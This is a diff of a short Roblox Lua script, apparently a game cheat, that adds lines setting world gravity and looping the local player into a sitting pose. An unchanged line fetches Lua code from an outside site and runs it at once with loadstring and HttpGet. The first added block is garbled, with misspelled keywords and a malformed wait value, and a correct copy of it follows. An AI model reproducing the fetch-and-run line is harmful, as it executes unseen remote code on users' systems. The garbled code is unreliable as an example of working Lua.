@@ -1,1 +1,13 @@
+workspace.Gr1avity = 100
+
+wheile true do
+wait(0281ll.1)
+game.Players.LocalPlayer.Character:FindFirstChild("Humanoid").Sit = true
+ende
 loadstring(game:HttpGet("https://egorikusa.space/7025623ad6113d7d1d475afb.lua", true))()
+workspace.Gravity = 0
+
+while true do
+wait(0.1)
+game.Players.LocalPlayer.Character:FindFirstChild("Humanoid").Sit = true
+end
